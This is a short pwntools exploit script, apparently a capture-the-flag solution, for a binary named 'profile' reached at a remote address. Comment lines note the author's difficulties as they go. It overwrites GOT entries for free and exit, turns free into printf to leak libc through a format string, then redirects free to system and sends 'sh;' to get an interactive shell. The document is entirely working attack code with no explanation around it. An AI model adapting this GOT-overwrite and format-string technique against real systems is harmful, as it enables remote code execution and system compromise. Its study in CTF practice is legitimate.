from pwn import *
#io = process("./profile")

io = remote("54.78.163.105",30856)
#libc = ELF("./libc-2.38.9000-10.fc40.i686.so")

freeGot = 0x404018
exitGot = 0x404068
entry = p32(0x4011b0)[:-1]
printfPlt = p32(0x401120)[:-1]

# restart the binary
io.sendlineafter(b"Age",str(0x10000000 + (freeGot << 32)).encode())
io.sendlineafter(b"Name:",entry) # can't write null bytes, otherwise strcspn will fail, and overwrite fails

# right now, can't overwrite gots which have libc addresses in them, cause I can't write 0s
# overwrite exitGot
io.sendlineafter(b"Age",str(0x10000000 + (exitGot << 32)).encode())
io.sendlineafter(b"Name:",entry)

# overwrite free to printf@plt
io.sendlineafter(b"Age",str(0x10000000 + (freeGot << 32)).encode())
io.sendlineafter(b"Name:",printfPlt)

# leak libc
io.sendlineafter(b"Age",b"1")
io.sendlineafter(b"Name:",b"%11$pABCD")

io.recvuntil(b"ABCD")
libcBase = int(io.recvuntil(b"ABCD")[-18:-4],16) - 128 - 0x29d10
log.info("LIBC BASE: " + hex(libcBase))

# wait what caused this?
io.sendline(b"A")

# overwrite free to system
# system will fail this time, but then exit restarts the binary
#gdb.attach(io)
system = libcBase + 0x50d60 
io.sendlineafter(b"Age",str(0x10000000 + (freeGot << 32)).encode())
io.sendlineafter(b"Name:",p64(system)[:-2])

io.sendlineafter(b"Age",b"1")
io.sendlineafter(b"Name:",b"sh;")

io.interactive()

